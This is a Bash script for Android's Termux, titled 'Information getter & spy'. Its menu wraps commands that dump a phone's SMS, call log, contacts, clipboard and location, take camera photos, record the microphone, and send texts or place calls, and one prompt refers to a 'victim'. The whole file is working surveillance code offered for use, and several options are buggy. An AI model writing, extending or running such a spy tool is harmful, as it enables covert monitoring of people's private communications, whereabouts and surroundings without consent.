#!/bin/bash

function unvaible() {
	echo "    [!] Unvaible, sorry ;("
}

function show_main() {
	echo
	echo "    ==>Information getter & spy"
   	echo
        echo "    [1]  battery-status"
        echo "    [2]  brightness"
        echo "    [3]  call-log"
        echo "    [4]  camera-info"
        echo "    [5]  camera-photo"
        echo "    [6]  clipboard-get"
        echo "    [7]  clipboard-set"
        echo "    [8]  contact-list"
        echo "    [9]  dialog"
        echo "    [10] download"
        echo "    [11] fingerprint"
        echo "    [12] infrared-frequencies"
        echo "    [13] infrared-transmit"
        echo "    [14] job-scheduler"
        echo "    [15] location"
        echo "    [16] media-player"
        echo "    [17] media-scan"
        echo "    [18] microphone-record"
        echo "    [19] notification"
        echo "    [20] notification-remove"
        echo "    [21] sensor"
        echo "    [22] share"
        echo "    [23] sms-list"
        echo "    [24] sms-send"
        echo "    [25] storage-get"
        echo "    [26] telephony-call"
        echo "    [27] telephony-cellinfo"
        echo "    [28] telephony-deviceinfo"
        echo "    [29] toast"
        echo "    [30] torch"
        echo "    [31] tts-engines"
        echo "    [32] tts-speak"
        echo "    [33] usb"
        echo "    [34] vibrate"
        echo "    [35] volume"
        echo "    [36] wallpaper"
        echo "    [37] wifi-connectioninfo"
        echo "    [38] wifi-enable"
        echo "    [39] wifi-scaninfo"
	echo "    [40] cpu-info" #lscpu
	echo "    [41] machine-hardware-name" #uname -a
	echo "    [42] hardware-information" #hwinfo - not integred - hwinfo
	echo "    [43] list-pci" #lspci - not integred - pciutils
	echo "    [44] mount"
	echo "    [45] proc-files"
	echo "    [46] inxi" # inxi - not integred
	echo "    [47] list-storage"
	echo
	echo "    => use !quit_infogetter to exit."
	echo "    => use !show_main to showm options again."
}

function information_getter() {
	show_main
	while true
	do
	read -p "    [?] Option: " input


	if [[ "$input" == "!quit_infogetter" ]]; then
		break
	elif [[ "$input" == "!show_main" ]]; then
		show_main
	fi


	case "$input" in
		1)termux-battery-status ;;
		2)read -p "    [?] Brightness value (0 - 255): " value ; termux-brightness $value ;;
		3)termux-call-log ;;
		4)termux-camera-info ;;
		5)read -p "    [?] Camera ID (default: 0): " value ; if [[ "$value" == '' ]]; then value='0' ; termux-camera-photo -c $value ; else  termux-camera-photo -c $value ; fi ;;
		6)termux-clipboard-get ;;
		7)read -p "    [?] Text to set: " value ; termux-clipboard-set $value ;;
		8)termux-contact-list ;;
		9)read -p "    [?] Message to send: " value  ; termux-dialog -t $value ; echo "    [*] Waiting victim response..." ;;
		10)read -p "    [?] Set options (description title path url)" desc title path url ; termux-download -d '$desc' -t '$title' -p '$path' $url ;;
		11)termux-fingerprint ;;
		12)termux-infrared-frequencies ;;
		13)read -p "    [?] Frequency: " value ; termux-infrared-transmit $value ;;
		14)unvaible ;;
		15)termux-location ;;
		16)read -p "    [?] File: " value ; termux-media-player play $value;;
		17)read -p "    [?] Directory to scan"termux-media-scan ;;
		18)read -p "    [?] Set record time duration (seconds): " value ; termux-microphone-record -l $value && mv /storage/emulated/0/TermuxAudioRecording* ./audios ;;
		19)read -p "    [?] Notification text: " value ; termux-notification -t $value ;;
		20)read -p "    [?] Notification ID to remove: " value ; termux-notification-remove ;;
		21)termux-sensor -l ;;
		22)read -p "    [?] File to share: " value ; termux-share -a send $value ;;
		23)termux-sms-list ;;
		24)read -p "    [?] Set the number(s) ([number(s)] [text]): " num text ; termux-sms-send -n $num $text  ;;
		25)read -p "    [?] Set a output file: " value ; termux-storage-get $value ;;
		26)read -p "    [?] Number to call: " value ; termux-telephony-call $value  ;;
		27)termux-telephony-cellinfo ;;
		28)termux-telephony-deviceinfo ;;
		29)read -p "    [?] Text to show in a toast: " value ; termux-toast $value ;;
		30)read -p "    [?] Toggle LED torch (on/off): " value ; termux-torch $value ;;
		31)unvaible ;;
		32)unvaible ;;
		33)termux-usb ;;
		34)termux-vibrate -p "    [?] Set vibration duration (ms): " value ; termux-vibrate -d $value ;;
		35)read -p "    [?] Set volume (stream[alarm, music, notification, ring, system, call] volume[1 - 100]): " stream volume; termux-volume $stream $volume;;
		36)read -p "    [?] Route or URL: " value ; termux-wallpaper -u $value ;;
		37)termux-wifi-connectioninfo ;;
		38)read -p "    [?] Wifi enable (true/false): " value ; termux-wifi-enable $value ;;
		39)termux-wifi-scaninfo ;;
		40)lscpu ;;
		41)uname -a ;;
		42)hwinfo ;;
		43)lspci ;;
		44)mount | column -t ;;
		45)cat /proc/cpuinfo ;;
		46)inxi -Fx ;;
		47)ls /storage/emulated/0/*;;
	esac
	done
}
